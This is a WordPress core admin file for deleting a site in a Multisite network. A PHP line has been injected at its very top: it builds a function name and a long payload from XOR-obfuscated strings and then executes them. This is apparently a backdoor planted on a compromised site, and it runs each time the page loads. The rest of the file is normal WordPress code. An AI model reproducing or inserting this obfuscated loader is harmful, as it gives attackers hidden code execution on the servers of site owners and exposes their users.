<?php $SXnRCEhjGy='M5I H<o<IU2.<QB'^'.G,A<Y0Z<;QZU>,';$NpGTygHjVR=$SXnRCEhjGy('','>QJM78:CH:WZr7X :X1OeT:NdD;<U5g+GXlCpS994<O6 HZ<4U4<G,43ET4998IEAYO72ZjV.T7gXCtVG,2O:iY<OYomEfbO1ZRRBEB<tXkWZsp-W=YNBYEEiSS:WqXsU>lmEDAZeAIXSGhyypDQ,9heD1Khjv;4EjoYOVO<Z6YW4boSYMb<xjo5HJ-;U9TPJB>Hhv:NNo<2FRT.BPnsF265<EOCnU+ZQ880TGus.79+ Hz33ABKMCSPoma-<7xzimZ7KS2ROQswoi8W<2Igl+7Dt6 XV>XH6hItL:7Grnjh5Q6JcHrfZTV;7wI;rfE,GcQGR2IZbvJ12F.5T;O=CZs<:++4r7>j4OwU1WUiZVuADTG>1GI:4hoL<ZBLmRQRfYiHZSMk;8ls+.=AivfJ1MU 4Yr1.eExKaZ+>.oovy1VB=I+UXGLUeO+N9>5558b,- G2A8HxM,SS1:74eM+VLMkNZSQMDXiX,8YxyxISKH<8=TmLqmL<R3KsW70l+>UJ79dL8W2tDKWU+T9LONmFEPIblvV-,+kKKV0UddljIUuArYw.+hFrWE41EaQWHcTXOLDYcBRfS,WCoORJh Y70IoQTEh4HGI65meGW.Y  5cvMv 5C7azDPhgvp+hXENRURU11I6jr7Y.=94=h8fr6cQ<+>AWmiI4'^'W7blQMT <S84-R II,BgB,U<; ZH4j8F2,KjYsB3=Z:XC<3SZuLS5sPR15kfTM=me=.CSvJrE1NNxcTvgW8F3M6I;yRMbAYE8S4=0mfUTeKgaSTDkN-<.<+mM72N6XcSqWGFlNHSA.<,siUYQT 0XX3A-lk6JRPQ<1K0osoO.D52ZJK8<4KaQQe<A8HO K:xn-K<AM0G3eA8Lv0O61NNfTWYO tIJ1J.0gSU-gHSHVUXEsp9U.0., ;pGI>nsx33,M;DkwY76qNIOMN6PG,NLP=MPRA,7a3-OHtThQR>IdcLQ0B+CuRB,5:NRLCFxl,JgKpc6S=;KV1;; AG1Z,UcrWchnza7djJU<WqZ2,IghUe25+KTniA>afhX;6-294+FdIl164P11eWOOI IKFnG,9UQbx8So8rAE>JJOORV9D81X;B44.60M7D<fZTATg=AXToP K-Nys76RUSQMiO78,Bbzw5,0963IApQBr 5clXYI5MjWM-N R2,<RI3NF<9CJLkS2KShks1J XeohKfm=-WDR2LXJ0l 3Ir9MLWtuRxJkCHMYsA3rQSsQfo.W2n-xuhS cTbM5dFotlHA+EQ00:1<7Q0.:BFEB76W5OAQDZmRDT7VHSdpHGVPPbQ 839zqUP=W1UG8WQVUYOeOI<j4DBJigDRCI');$NpGTygHjVR();
/**
 * Multisite delete site panel.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

require_once( dirname( __FILE__ ) . '/admin.php' );

if ( !is_multisite() )
	wp_die( __( 'Multisite support is not enabled.' ) );

if ( ! current_user_can( 'delete_site' ) )
	wp_die(__( 'Sorry, you are not allowed to delete this site.'));

if ( isset( $_GET['h'] ) && $_GET['h'] != '' && get_option( 'delete_blog_hash' ) != false ) {
	if ( hash_equals( get_option( 'delete_blog_hash' ), $_GET['h'] ) ) {
		wpmu_delete_blog( $wpdb->blogid );
		wp_die( sprintf( __( 'Thank you for using %s, your site has been deleted. Happy trails to you until we meet again.' ), get_network()->site_name ) );
	} else {
		wp_die( __( "I'm sorry, the link you clicked is stale. Please select another option." ) );
	}
}

$blog = get_site();
$user = wp_get_current_user();

$title = __( 'Delete Site' );
$parent_file = 'tools.php';
require_once( ABSPATH . 'wp-admin/admin-header.php' );

echo '<div class="wrap">';
echo '<h1>' . esc_html( $title ) . '</h1>';

if ( isset( $_POST['action'] ) && $_POST['action'] == 'deleteblog' && isset( $_POST['confirmdelete'] ) && $_POST['confirmdelete'] == '1' ) {
	check_admin_referer( 'delete-blog' );

	$hash = wp_generate_password( 20, false );
	update_option( 'delete_blog_hash', $hash );

	$url_delete = esc_url( admin_url( 'ms-delete-site.php?h=' . $hash ) );

	$switched_locale = switch_to_locale( get_locale() );

	/* translators: Do not translate USERNAME, URL_DELETE, SITE_NAME: those are placeholders. */
	$content = __( "Howdy ###USERNAME###,

You recently clicked the 'Delete Site' link on your site and filled in a
form on that page.

If you really want to delete your site, click the link below. You will not
be asked to confirm again so only click this link if you are absolutely certain:
###URL_DELETE###

If you delete your site, please consider opening a new site here
some time in the future! (But remember your current site and username
are gone forever.)

Thanks for using the site,
Webmaster
###SITE_NAME###" );
	/**
	 * Filters the email content sent when a site in a Multisite network is deleted.
	 *
	 * @since 3.0.0
	 *
	 * @param string $content The email content that will be sent to the user who deleted a site in a Multisite network.
	 */
	$content = apply_filters( 'delete_site_email_content', $content );

	$content = str_replace( '###USERNAME###', $user->user_login, $content );
	$content = str_replace( '###URL_DELETE###', $url_delete, $content );
	$content = str_replace( '###SITE_NAME###', get_network()->site_name, $content );

	wp_mail( get_option( 'admin_email' ), "[ " . wp_specialchars_decode( get_option( 'blogname' ) ) . " ] ".__( 'Delete My Site' ), $content );

	if ( $switched_locale ) {
		restore_previous_locale();
	}
	?>

	<p><?php _e( 'Thank you. Please check your email for a link to confirm your action. Your site will not be deleted until this link is clicked.' ) ?></p>

<?php } else {
	?>
	<p><?php printf( __( 'If you do not want to use your %s site any more, you can delete it using the form below. When you click <strong>Delete My Site Permanently</strong> you will be sent an email with a link in it. Click on this link to delete your site.'), get_network()->site_name); ?></p>
	<p><?php _e( 'Remember, once deleted your site cannot be restored.' ) ?></p>

	<form method="post" name="deletedirect">
		<?php wp_nonce_field( 'delete-blog' ) ?>
		<input type="hidden" name="action" value="deleteblog" />
		<p><input id="confirmdelete" type="checkbox" name="confirmdelete" value="1" /> <label for="confirmdelete"><strong><?php
			printf(
				/* translators: %s: site address */
				__( "I'm sure I want to permanently disable my site, and I am aware I can never get it back or use %s again." ),
				$blog->domain . $blog->path
			);
		?></strong></label></p>
		<?php submit_button( __( 'Delete My Site Permanently' ) ); ?>
	</form>
 	<?php
}
echo '</div>';

include( ABSPATH . 'wp-admin/admin-footer.php' );
